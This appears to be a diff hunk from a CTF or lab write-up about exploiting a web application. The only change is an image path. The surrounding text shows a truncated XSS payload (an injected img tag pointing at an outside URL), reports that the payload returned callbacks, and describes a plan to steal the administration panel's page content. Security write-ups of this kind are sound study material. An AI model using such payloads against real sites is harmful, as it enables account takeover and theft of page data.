@@ -126,6 +126,6 @@ aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa<select<style/><img src='http://
 
 This payload worked! I was able to retrieve two callbacks after creating the clipnote.
 
-<figure><img src="../../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (2) (1) (5).png" alt=""><figcaption></figcaption></figure>
 
 Now we can use a script from Hacktricks to steal the page content of the administration panel. However, seems like sending GET requests via this method does not work. Had a hard time making it work with the reports feature, but I'll get there. WIP.
